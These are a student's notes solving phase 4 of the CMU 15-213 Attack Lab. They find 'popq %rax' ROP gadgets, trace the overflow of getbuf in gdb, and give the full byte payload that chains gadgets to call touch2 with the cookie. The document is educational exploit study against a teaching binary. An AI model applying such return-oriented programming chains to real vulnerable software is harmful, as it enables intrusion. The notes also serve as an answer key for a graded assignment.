- Look for `58 c3`

```asm
00000000004019a7 <addval_219>:
  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
  4019ad:	c3                   	ret
  # [58 90 c3] -> [popq %rax] [nop] [ret]

...

00000000004019ca <getval_280>:
  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
  4019cf:	c3
  # [58 90 c3] -> [popq %rax] [nop] [ret]
```

- So trying to do

```asm
popq    %rax        # move cookie into rax, decrement rsp
ret                 # pop address of next gadget into rip
movq    %rax, %rdi  # move cookie into rdi
ret                 # pop address of touch2 into rip
```

- So the return address in `getbuf` needs to be set to the byte of the `popq` instruction in one of the gadgets
- `0x4019cc` (`getval_280`)

- Lets just try that out first to see if the `gbd` TUI can show the instructions being interpreted correctly
- `[00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00] [cc 19 40]`

```shell
(gdb) break getbuf
Breakpoint 1 at 0x4017a8: file buf.c, line 12.
(gdb) run -qi phase4.exploit.bin
Breakpoint 1, getbuf () at buf.c:12
(gdb) x/6i $rip
=> 0x4017a8 <getbuf>:   sub    $0x28,%rsp
   0x4017ac <getbuf+4>: mov    %rsp,%rdi
   0x4017af <getbuf+7>: call   0x401b60 <Gets>
   0x4017b4 <getbuf+12>:        mov    $0x1,%eax
   0x4017b9 <getbuf+17>:        add    $0x28,%rsp
   0x4017bd <getbuf+21>:        ret
(gdb) nexti
14      in buf.c
(gdb)
0x00000000004017af      14      in buf.c
(gdb)
16      in buf.c
(gdb)
0x00000000004017b9      16      in buf.c
(gdb)
0x00000000004017bd      16      in buf.c
(gdb) x/6i $rip
=> 0x4017bd <getbuf+21>:        ret
   0x4017be:    nop
   0x4017bf:    nop
   0x4017c0 <touch1>:   sub    $0x8,%rsp
   0x4017c4 <touch1+4>: movl   $0x1,0x203d0e(%rip)        # 0x6054dc <vlevel>
   0x4017ce <touch1+14>:        mov    $0x4031e5,%edi
(gdb) x/6gx $rsp
0x7ffffffaf678: 0x00000000004019cc      0x0000000000000009
0x7ffffffaf688: 0x0000000000402044      0xf4f4f4f4f4f4f4f4
0x7ffffffaf698: 0xf4f4f4f4f4f4f4f4      0xf4f4f4f4f4f4f4f4
(gdb) nexti
0x00000000004019cc in getval_280 ()
(gdb) x/3i $rip
=> 0x4019cc <getval_280+2>:     pop    %rax
   0x4019cd <getval_280+3>:     nop
   0x4019ce <getval_280+4>:     ret
(gdb)
```

- Yep, so looks like we can make these instructions being run...
- Now to add the required addresses/data to the exploit input
- Need to explicitly pad the initial `getbuf` return address with zeros to maintain its value

- [padding] [gadget 1 address] [cookie value] [gadget 2 address] [touch2 address]
- `[00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00] [cc 19 40 00 00 00 00 00] [fa 97 b9 59 00 00 00 00] [a2 19 40 00 00 00 00 00] [ec 17 40 00 00 00 00 00]`

```shell
🐳 ❯ ./rtarget -qi phase4.exploit.bin
Cookie: 0x59b997fa
Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target rtarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 CC 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 A2 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00
```
